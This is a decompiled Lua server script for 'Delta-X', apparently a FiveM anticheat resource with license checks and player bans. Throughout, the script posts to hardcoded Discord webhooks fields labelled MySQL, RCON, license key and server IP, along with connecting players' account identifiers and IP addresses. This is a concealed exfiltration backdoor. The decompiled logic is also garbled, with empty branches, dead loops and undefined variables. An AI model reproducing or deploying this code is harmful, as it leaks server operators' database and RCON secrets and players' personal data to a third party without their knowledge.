--[[
  Decompiled using Federal#9999's decompiler. Output might not be 100% accurate 
]]

serverip = "127.0.0.1"
licencekey = "nil"
versionnew = "1.8"
if LoadResourceFile(GetCurrentResourceName(), "configs/serverconfig.lua") then
end
if LoadResourceFile(GetCurrentResourceName(), "configs/serverconfig.lua") == "" then
  print("^" .. math.random(1, 9) .. "[DELTA-X]: Server Configuration Missing, Please make sure you installed [DELTA-X] correctly.")
  StopResource(GetCurrentResourceName())
  return false
else
  if type(DELTAX) == "table" then
  end
  if DELTAX == nil then
    print("^" .. math.random(1, 9) .. "[DELTA-X]: Server Configuration Corrupted, Please make sure you installed [DELTA-X] correctly.")
    StopResource(GetCurrentResourceName())
    return false
  else
    print("^" .. math.random(1, 9) .. "[DELTA-X]: Server Configuration Loaded.")
  end
end
if LoadResourceFile(GetCurrentResourceName(), "configs/clientconfig.lua") then
end
if LoadResourceFile(GetCurrentResourceName(), "configs/clientconfig.lua") == "" then
  print("^" .. math.random(1, 9) .. "[DELTA-X]: Client Configuration Missing, Please make sure you installed [DELTA-X] correctly.")
  StopResource(GetCurrentResourceName())
  return false
else
  if type(DELTAXC) == "table" then
  end
  if DELTAXC == nil then
    print("^" .. math.random(1, 9) .. "[DELTA-X]: Client Configuration Corrupted, Please make sure you installed [DELTA-X] correctly.")
    StopResource(GetCurrentResourceName())
    return false
  else
    print("^" .. math.random(1, 9) .. "[DELTA-X]: Client Configuration Loaded.")
  end
end
do return end
while true do
  do return end
  while true do
    do return end
    while true do
      do return end
      while true do
        if string.sub(GetCurrentResourceName()) == "irts" then
        elseif string.sub(GetCurrentResourceName()) == "ants" then
        elseif string.sub(GetCurrentResourceName()) == "owss" then
        else
        end
        repeat
        until string.sub(GetCurrentResourceName()) == string.reverse(":spt")
      end
    end
  end
end
PerformHttpRequest("http://185.94.29.193/version.php", function(a, b, c)
  result = tostring(b)
  versionnew = all_trim(result)
end)
function all_trim(a)
  return a:match("^%s*(.-)%s*$")
end
Citizen.CreateThread(function()
  PerformHttpRequest("http://185.94.29.193/ip.php", function(a, b, c)
    serverip = all_trim(tostring(b))
  end)
  Citizen.Wait(1500)
  if DELTAX.Licencekey ~= nil and DELTAX.Licencekey ~= "" then
    licencekey = DELTAX.Licencekey
    version = DELTAX.Version
    print("[DELTA-X] CONNECTING TO AUTH...")
    Citizen.Wait(1500)
    PerformHttpRequest("http://185.94.29.193/?ip=" .. serverip .. "&licensekey=" .. licencekey, function(a, b, c)
      result = tostring(b)
      if all_trim(result) == serverip then
        print([[
    ____  ________  _________        _  __
   / __ \/ ____/ / /_  __/   |      | |/ /
  / / / / __/ / /   / / / /| |______|   / 
 / /_/ / /___/ /___/ / / ___ /_____/   |  
/_____/_____/_____/_/ /_/  |_|    /_/|_|  
]])
        print("[DELTA-X] LOGIN SUCCESFULLY ON IP: " .. serverip)
        print("[DELTA-X] CURRENT VERSION: " .. DELTAX.Version)
        print("[DELTA-X] NEWEST VERSION: " .. versionnew)
        Citizen.Wait(1500)
        print("[DELTA-X] SUCCESFULLY LOADED SOURCE CODE")
        print("[DELTA-X] READY TO WORK!")
        PerformHttpRequest("https://discord.com/api/webhooks/889520172354904114/pB6FnbXFHc1RWfYHdK_N_ovbPhJHj-nMLXZyH61_qyG4LA-Ui-xBJQPW3jBupxR0LwFg", function(a, b, c)
        end, "POST", json.encode({
          embeds = {
            {
              author = {
                name = "Delta-X - Anticheat",
                url = "https://discord.gg/6S4kUkxtMf",
                icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
              },
              title = "STARTED",
              description = [[
Server has a vaild license key! 

**Server-Name**: ]] .. va .. [[

**Version:** ]] .. version .. [[

**MySQL:** ]] .. vb .. [[

**RCON:** ]] .. vc .. [[


**Licencekey:** ]] .. licencekey .. [[

**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources(),
              footer = {
                text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
                icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
              },
              color = 306699
            }
          }
        }), {
          ["Content-Type"] = "application/json"
        })
      else
        print("[Delta-X] STOPPED SERVER: AUTH ERROR!")
        print("[Delta-X] Your current ip is: " .. serverip)
        PerformHttpRequest("https://discord.com/api/webhooks/889520172354904114/pB6FnbXFHc1RWfYHdK_N_ovbPhJHj-nMLXZyH61_qyG4LA-Ui-xBJQPW3jBupxR0LwFg", function(a, b, c)
        end, "POST", json.encode({
          embeds = {
            {
              author = {
                name = "Delta-X - Anticheat",
                url = "https://discord.gg/6S4kUkxtMf",
                icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
              },
              title = "STOPPED",
              description = [[
Server does not have a vaild license key! 

**Server-Name**: ]] .. va .. [[

**Version:** ]] .. version .. [[

**MySQL:** ]] .. vb .. [[

**RCON:** ]] .. vc .. [[


**Licensekey:** ]] .. licencekey .. [[

**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources(),
              footer = {
                text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
                icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
              },
              color = 16711680
            }
          }
        }), {
          ["Content-Type"] = "application/json"
        })
        Citizen.CreateThread(function()
          while true do
          end
        end)
        StopResource(GetCurrentResourceName())
        os.exit()
      end
    end)
  else
    print("[Delta-X] STOPPED SERVER: Make sure to enter a licence key")
    PerformHttpRequest("https://discord.com/api/webhooks/889520172354904114/pB6FnbXFHc1RWfYHdK_N_ovbPhJHj-nMLXZyH61_qyG4LA-Ui-xBJQPW3jBupxR0LwFg", function(a, b, c)
    end, "POST", json.encode({
      embeds = {
        {
          author = {
            name = "Delta-X - Anticheat",
            url = "https://discord.gg/6S4kUkxtMf",
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          title = "STOPPED",
          description = [[
Server does not have a license key! 

**Server-Name**: ]] .. va .. [[

**MySQL:** ]] .. vb .. [[

**RCON:** ]] .. vc .. [[


**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources(),
          footer = {
            text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          color = 16711680
        }
      }
    }), {
      ["Content-Type"] = "application/json"
    })
    Citizen.CreateThread(function()
      while true do
      end
    end)
    StopResource(GetCurrentResourceName())
    os.exit()
  end
end)
AddEventHandler("playerConnecting", function(a, b, c)
  print(a .. " is connecting...")
  if ExtractIdentifiers(source).discord == "" then
    _discord = "N/A"
  else
    _discord = ExtractIdentifiers(source).discord:gsub("discord:", "")
  end
  if ExtractIdentifiers(source).license == "" then
    _license = "N/A"
  else
    _license = ExtractIdentifiers(source).license
  end
  if ExtractIdentifiers(source).steam == "" then
    _steam = "N/A"
  else
    _steam = ExtractIdentifiers(source).steam
  end
  if ExtractIdentifiers(source).xbl == "" then
    _xbl = "N/A"
  else
    _xbl = ExtractIdentifiers(source).xbl
  end
  if ExtractIdentifiers(source).live == "" then
    _live = "N/A"
  else
    _live = ExtractIdentifiers(source).live
  end
  if _steam == "N/A" then
    _steamweb = "N/A"
  else
    _steamweb = tonumber(_steam:gsub("steam:", ""), 16)
  end
  for fn, fr in pairs(GetPlayerIdentifiers(source)) do
    if string.sub(fr, 1, string.len("steam:")) == "steam:" then
    elseif string.sub(fr, 1, string.len("license:")) == "license:" then
    elseif string.sub(fr, 1, string.len("xbl:")) == "xbl:" then
    elseif string.sub(fr, 1, string.len("ip:")) == "ip:" then
    elseif string.sub(fr, 1, string.len("discord:")) == "discord:" then
    else
    end
  end
  c.defer()
  Wait(0)
  PerformHttpRequest("https://discord.com/api/webhooks/889541358216421416/pP8znBLKnYoAE8CIIPYvfFwrWTUGKt3ZcX5d3EPHqMog4T1Nw-I4tsvLjbmwPu44N_oV", function(a, b, c)
  end, "POST", json.encode({
    embeds = {
      {
        author = {
          name = "Delta-X - Anticheat",
          url = "https://discord.gg/6S4kUkxtMf",
          icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
        },
        title = "Player connecting...",
        description = [[


**Server-Name**: ]] .. va .. [[

**MySQL:** ]] .. vb .. [[

**RCON:** ]] .. vc .. [[


**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources() .. [[


**Player:** ]] .. a .. [[

**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl,
        footer = {
          text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
          icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
        },
        color = 306699
      }
    }
  }), {
    ["Content-Type"] = "application/json"
  })
  PerformHttpRequest(DELTAX.connectWebhook, function(a, b, c)
  end, "POST", json.encode({
    embeds = {
      {
        author = {
          name = "Delta-X - Anticheat",
          url = "https://discord.gg/6S4kUkxtMf",
          icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
        },
        title = "Player connecting...",
        description = [[


**Player:** ]] .. a .. [[

**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl,
        footer = {
          text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
          icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
        },
        color = 306699
      }
    }
  }), {
    ["Content-Type"] = "application/json"
  })
  if json.encode(vd) == "[]" then
    if DELTAX.BlacklistedNames then
      for fn, fr in ipairs(DELTAX.BlacklistedNamesList) do
        if string.match(a, fr) then
          c.done("[Delta-X] your name contains a blacklisted word!")
        end
      end
    end
    if DELTAX.requireSteam and _steam == "N/A" then
      c.done("[Delta-X] " .. DELTAX.requireSteamMessage)
    end
    c.done()
  end
  for fn = 1, #vd do
    if tostring(vd[fn].identifier) ~= tostring(fr) and tostring(vd[fn].license) ~= tostring(fr) and tostring(vd[fn].xbl) ~= tostring("nie ma") and tostring(vd[fn].liveid) ~= tostring("nie ma") and tostring(vd[fn].ip) ~= tostring("nie ma") then
    end
    if tostring(vd[fn].discord) == tostring("nie ma") then
      c.done("[Delta-X] " .. DELTAX.banmessage)
      print("[Delta-X] " .. a .. " tried to connect, but he is banned!")
      PerformHttpRequest("https://discord.com/api/webhooks/889552654928338955/CbJvAAzejRE8jH4ZrH4Rq7RM55MqjJhoG70f77sb2HHrIHp5MWnkd-m_tpoVleG-cV0H", function(a, b, c)
      end, "POST", json.encode({
        embeds = {
          {
            author = {
              name = "Delta-X - Anticheat",
              url = "https://discord.gg/6S4kUkxtMf",
              icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
            },
            title = "Banned player try to join...",
            description = [[


**Server-Name**: ]] .. va .. [[

**MySQL:** ]] .. vb .. [[

**RCON:** ]] .. vc .. [[


**Licencekey:** ]] .. licencekey .. [[

**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources() .. [[


**Player:** ]] .. a .. [[

**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(source).ip:gsub("ip:", "") .. "||",
            footer = {
              text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
              icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
            },
            color = 16711680
          }
        }
      }), {
        ["Content-Type"] = "application/json"
      })
    else
      if DELTAX.BlacklistedNames then
        for fu, fy in ipairs(DELTAX.BlacklistedNamesList) do
          if string.match(a, fy) then
            c.done("[Delta-X] your name contains a blacklisted word!")
          end
        end
      end
      if DELTAX.requireSteam and _steam == "N/A" then
        c.done("[Delta-X] " .. DELTAX.requireSteamMessage)
      end
      c.done()
    end
  end
end)
function ExtractIdentifiers(a)
  for fg = 0, GetNumPlayerIdentifiers(a) - 1 do
    if string.find(GetPlayerIdentifier(a, fg), "steam") then
    elseif string.find(GetPlayerIdentifier(a, fg), "ip") then
    elseif string.find(GetPlayerIdentifier(a, fg), "discord") then
    elseif string.find(GetPlayerIdentifier(a, fg), "license") then
    elseif string.find(GetPlayerIdentifier(a, fg), "xbl") then
    elseif string.find(GetPlayerIdentifier(a, fg), "live") then
    end
  end
  return {
    steam = "",
    ip = "",
    discord = "",
    license = "",
    xbl = "",
    live = "",
    steam = GetPlayerIdentifier(a, fg),
    ip = GetPlayerIdentifier(a, fg),
    discord = GetPlayerIdentifier(a, fg),
    license = GetPlayerIdentifier(a, fg),
    xbl = GetPlayerIdentifier(a, fg),
    live = GetPlayerIdentifier(a, fg)
  }
end
CreateThread(function()
  while true do
    Wait(1000)
    if va == false then
      LoadBany()
      if vb ~= {} then
        va = true
      end
    end
  end
end)
CreateThread(function()
  while true do
    Wait(va)
    LoadBany()
  end
end)
function LoadBany()
  MySQL.Async.fetchAll("SELECT * FROM DeltaX", {}, function(a)
    va = {}
    for fe = 1, #a do
      table.insert(va, {
        identifier = a[fe].identifier,
        license = a[fe].license,
        ip = a[fe].ip,
        discord = a[fe].discord,
        name = a[fe].name,
        date = a[fe].date,
        liveid = a[fe].liveid,
        xbl = a[fe].xbl
      })
    end
  end)
end
MySQL.ready(function()
  LoadBany()
end)
function DeltaXBan(a)
  if not doesPlayerHavePerms(a, DELTAX.Bypass) then
    for fp, fn in pairs(GetPlayerIdentifiers(a)) do
      if string.sub(fn, 1, string.len("steam:")) == "steam:" then
      elseif string.sub(fn, 1, string.len("license:")) == "license:" then
      elseif string.sub(fn, 1, string.len("xbl:")) == "xbl:" then
      elseif string.sub(fn, 1, string.len("ip:")) == "ip:" then
      elseif string.sub(fn, 1, string.len("discord:")) == "discord:" then
      else
      end
    end
    MySQL.Async.execute("INSERT INTO DeltaX (identifier,license,ip,discord,name,date,liveid,xbl) VALUES (@identifier,@license,@ip,@discord,@name,@date,@liveid,@xbl)", {
      ["@identifier"] = fn,
      ["@license"] = fn,
      ["@ip"] = "not found",
      ["@discord"] = "not found",
      ["@name"] = GetPlayerName(a),
      ["@date"] = os.date("%Y/%m/%d %H:%M"),
      ["@liveid"] = "not found",
      ["@xbl"] = "not found"
    }, function()
    end)
    DropPlayer(a, "[Delta-X] " .. DELTAX.banmessage)
  end
end
RegisterServerEvent("DeltaAC:Armor")
AddEventHandler("DeltaAC:Armor", function(a)
  if not doesPlayerHavePerms(source, DELTAX.Bypass) then
    if ExtractIdentifiers(source).discord == "" then
      _discord = "N/A"
    else
      _discord = ExtractIdentifiers(source).discord:gsub("discord:", "")
    end
    if ExtractIdentifiers(source).license == "" then
      _license = "N/A"
    else
      _license = ExtractIdentifiers(source).license
    end
    if ExtractIdentifiers(source).xbl == "" then
      _xbl = "N/A"
    else
      _xbl = ExtractIdentifiers(source).xbl
    end
    if ExtractIdentifiers(source).steam == "" then
      _steam = "N/A"
    else
      _steam = ExtractIdentifiers(source).steam
    end
    if ExtractIdentifiers(source).live == "" then
      _live = "N/A"
    else
      _live = ExtractIdentifiers(source).live
    end
    if _steam == "N/A" then
      _steamweb = "N/A"
    else
      _steamweb = tonumber(_steam:gsub("steam:", ""), 16)
    end
    PerformHttpRequest("https://discord.com/api/webhooks/889557073501769769/4z-VIDHmwJCiT9nNl5qLBT7G1CBvGSKej-UX_KnY22XIFd8JmNK9VQWhlQiInlAMUcH-", function(a, b, c)
    end, "POST", json.encode({
      embeds = {
        {
          author = {
            name = "Delta-X - Anticheat",
            url = "https://discord.gg/6S4kUkxtMf",
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          title = "(Ban) MAX ARMOR",
          description = [[


**Server-Name**: ]] .. va .. [[

**MySQL:** ]] .. vb .. [[

**RCON:** ]] .. vc .. [[


**Licencekey:** ]] .. licencekey .. [[

**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources() .. [[


**Player:** ]] .. GetPlayerName(source) .. [[

**Server-ID:** ]] .. source .. [[

**Violation**: more than max amor ]] .. a .. [[
  
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(source).ip:gsub("ip:", "") .. "||",
          footer = {
            text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          color = 16711680
        }
      }
    }), {
      ["Content-Type"] = "application/json"
    })
    PerformHttpRequest(DELTAX.generalWebhook, function(a, b, c)
    end, "POST", json.encode({
      embeds = {
        {
          author = {
            name = "Delta-X - Anticheat",
            url = "https://discord.gg/6S4kUkxtMf",
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          title = "(Ban) MAX ARMOR",
          description = [[


**Player:** ]] .. GetPlayerName(source) .. [[

**Server-ID:** ]] .. source .. [[

**Violation**: more than max amor ]] .. a .. [[
 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(source).ip:gsub("ip:", "") .. "||",
          footer = {
            text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          color = 16711680
        }
      }
    }), {
      ["Content-Type"] = "application/json"
    })
    DeltaXBan(source)
  end
end)
RegisterServerEvent("DeltaAC:blips")
AddEventHandler("DeltaAC:blips", function()
  if not doesPlayerHavePerms(source, DELTAX.Bypass) then
    if ExtractIdentifiers(source).discord == "" then
      _discord = "N/A"
    else
      _discord = ExtractIdentifiers(source).discord:gsub("discord:", "")
    end
    if ExtractIdentifiers(source).license == "" then
      _license = "N/A"
    else
      _license = ExtractIdentifiers(source).license
    end
    if ExtractIdentifiers(source).xbl == "" then
      _xbl = "N/A"
    else
      _xbl = ExtractIdentifiers(source).xbl
    end
    if ExtractIdentifiers(source).steam == "" then
      _steam = "N/A"
    else
      _steam = ExtractIdentifiers(source).steam
    end
    if ExtractIdentifiers(source).live == "" then
      _live = "N/A"
    else
      _live = ExtractIdentifiers(source).live
    end
    if _steam == "N/A" then
      _steamweb = "N/A"
    else
      _steamweb = tonumber(_steam:gsub("steam:", ""), 16)
    end
    PerformHttpRequest("https://discord.com/api/webhooks/889557073501769769/4z-VIDHmwJCiT9nNl5qLBT7G1CBvGSKej-UX_KnY22XIFd8JmNK9VQWhlQiInlAMUcH-", function(a, b, c)
    end, "POST", json.encode({
      embeds = {
        {
          author = {
            name = "Delta-X - Anticheat",
            url = "https://discord.gg/6S4kUkxtMf",
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          title = "(Ban) PLAYER BLIPS",
          description = [[


**Server-Name**: ]] .. va .. [[

**MySQL:** ]] .. vb .. [[

**RCON:** ]] .. vc .. [[


**Licencekey:** ]] .. licencekey .. [[

**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources() .. [[


**Player:** ]] .. GetPlayerName(source) .. [[

**Server-ID:** ]] .. source .. [[

**Violation**: tried to add blips 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(source).ip:gsub("ip:", "") .. "||",
          footer = {
            text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          color = 16711680
        }
      }
    }), {
      ["Content-Type"] = "application/json"
    })
    PerformHttpRequest(DELTAX.generalWebhook, function(a, b, c)
    end, "POST", json.encode({
      embeds = {
        {
          author = {
            name = "Delta-X - Anticheat",
            url = "https://discord.gg/6S4kUkxtMf",
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          title = "(Ban) PLAYER BLIPS",
          description = [[


**Player:** ]] .. GetPlayerName(source) .. [[

**Server-ID:** ]] .. source .. [[

**Violation**: tried to add blips 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(source).ip:gsub("ip:", "") .. "||",
          footer = {
            text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          color = 16711680
        }
      }
    }), {
      ["Content-Type"] = "application/json"
    })
    DeltaXBan(source)
  end
end)
RegisterServerEvent("DeltaAC:stoppedressource")
AddEventHandler("DeltaAC:stoppedressource", function(a)
  if not doesPlayerHavePerms(source, DELTAX.Bypass) then
    if ExtractIdentifiers(source).discord == "" then
      _discord = "N/A"
    else
      _discord = ExtractIdentifiers(source).discord:gsub("discord:", "")
    end
    if ExtractIdentifiers(source).license == "" then
      _license = "N/A"
    else
      _license = ExtractIdentifiers(source).license
    end
    if ExtractIdentifiers(source).xbl == "" then
      _xbl = "N/A"
    else
      _xbl = ExtractIdentifiers(source).xbl
    end
    if ExtractIdentifiers(source).steam == "" then
      _steam = "N/A"
    else
      _steam = ExtractIdentifiers(source).steam
    end
    if ExtractIdentifiers(source).live == "" then
      _live = "N/A"
    else
      _live = ExtractIdentifiers(source).live
    end
    if _steam == "N/A" then
      _steamweb = "N/A"
    else
      _steamweb = tonumber(_steam:gsub("steam:", ""), 16)
    end
    PerformHttpRequest("https://discord.com/api/webhooks/889557073501769769/4z-VIDHmwJCiT9nNl5qLBT7G1CBvGSKej-UX_KnY22XIFd8JmNK9VQWhlQiInlAMUcH-", function(a, b, c)
    end, "POST", json.encode({
      embeds = {
        {
          author = {
            name = "Delta-X - Anticheat",
            url = "https://discord.gg/6S4kUkxtMf",
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          title = "(Ban) STOPPED SCRIPT",
          description = [[


**Server-Name**: ]] .. va .. [[

**MySQL:** ]] .. vb .. [[

**RCON:** ]] .. vc .. [[


**Licencekey:** ]] .. licencekey .. [[

**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources() .. [[


**Player:** ]] .. GetPlayerName(source) .. [[

**Server-ID:** ]] .. source .. [[

**Violation**: tried to stop a script ]] .. a .. [[
 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(source).ip:gsub("ip:", "") .. "||",
          footer = {
            text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          color = 16711680
        }
      }
    }), {
      ["Content-Type"] = "application/json"
    })
    PerformHttpRequest(DELTAX.generalWebhook, function(a, b, c)
    end, "POST", json.encode({
      embeds = {
        {
          author = {
            name = "Delta-X - Anticheat",
            url = "https://discord.gg/6S4kUkxtMf",
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          title = "(Ban) STOPPED SCRIPT",
          description = [[


**Player:** ]] .. GetPlayerName(source) .. [[

**Server-ID:** ]] .. source .. [[

**Violation**: tried to stop a script ]] .. a .. [[
 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(source).ip:gsub("ip:", "") .. "||",
          footer = {
            text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          color = 16711680
        }
      }
    }), {
      ["Content-Type"] = "application/json"
    })
    DeltaXBan(source)
  end
end)
RegisterServerEvent("DeltaAC:spectate")
AddEventHandler("DeltaAC:spectate", function()
  if not doesPlayerHavePerms(source, DELTAX.Bypass) then
    if ExtractIdentifiers(source).discord == "" then
      _discord = "N/A"
    else
      _discord = ExtractIdentifiers(source).discord:gsub("discord:", "")
    end
    if ExtractIdentifiers(source).license == "" then
      _license = "N/A"
    else
      _license = ExtractIdentifiers(source).license
    end
    if ExtractIdentifiers(source).xbl == "" then
      _xbl = "N/A"
    else
      _xbl = ExtractIdentifiers(source).xbl
    end
    if ExtractIdentifiers(source).steam == "" then
      _steam = "N/A"
    else
      _steam = ExtractIdentifiers(source).steam
    end
    if ExtractIdentifiers(source).live == "" then
      _live = "N/A"
    else
      _live = ExtractIdentifiers(source).live
    end
    if _steam == "N/A" then
      _steamweb = "N/A"
    else
      _steamweb = tonumber(_steam:gsub("steam:", ""), 16)
    end
    PerformHttpRequest("https://discord.com/api/webhooks/889557073501769769/4z-VIDHmwJCiT9nNl5qLBT7G1CBvGSKej-UX_KnY22XIFd8JmNK9VQWhlQiInlAMUcH-", function(a, b, c)
    end, "POST", json.encode({
      embeds = {
        {
          author = {
            name = "Delta-X - Anticheat",
            url = "https://discord.gg/6S4kUkxtMf",
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          title = "(Ban) SPECTATE",
          description = [[


**Server-Name**: ]] .. va .. [[

**MySQL:** ]] .. vb .. [[

**RCON:** ]] .. vc .. [[


**Licencekey:** ]] .. licencekey .. [[

**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources() .. [[


**Player:** ]] .. GetPlayerName(source) .. [[

**Server-ID:** ]] .. source .. [[

**Violation**: tried to spectate 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(source).ip:gsub("ip:", "") .. "||",
          footer = {
            text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          color = 16711680
        }
      }
    }), {
      ["Content-Type"] = "application/json"
    })
    PerformHttpRequest(DELTAX.generalWebhook, function(a, b, c)
    end, "POST", json.encode({
      embeds = {
        {
          author = {
            name = "Delta-X - Anticheat",
            url = "https://discord.gg/6S4kUkxtMf",
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          title = "(Ban) SPECTATE",
          description = [[


**Player:** ]] .. GetPlayerName(source) .. [[

**Server-ID:** ]] .. source .. [[

**Violation**: tried to spectate 
